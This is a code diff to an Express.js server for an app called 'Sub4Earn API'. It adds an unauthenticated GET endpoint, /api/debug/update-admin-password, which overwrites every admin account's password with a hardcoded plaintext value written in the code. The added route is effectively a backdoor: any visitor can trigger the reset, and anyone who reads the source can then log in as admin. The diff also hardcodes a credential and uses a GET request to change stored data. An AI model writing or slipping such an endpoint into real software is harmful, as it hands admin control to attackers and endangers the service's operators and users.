@@ -47,6 +47,23 @@ app.use('/api/admin',    require('./routes/admin'));
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', app: 'Sub4Earn API' });
 });
+app.get("/api/debug/update-admin-password", async (req, res) => {
+  try {
+    const bcrypt = require("bcryptjs");
+
+    const NEW_PASSWORD = "R9@kL2#pX7!mQa4"; 
+
+    const hash = await bcrypt.hash(NEW_PASSWORD, 12);
+
+    db.prepare("UPDATE users SET password_hash=? WHERE role='admin'")
+      .run(hash);
+
+    res.json({ success: true, message: "Admin password updated" });
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
 
 /* ───────────────────────── DEBUG: Tasks Count ───────────────────────── */
 app.get('/api/debug/tasks-count', (req, res) => {
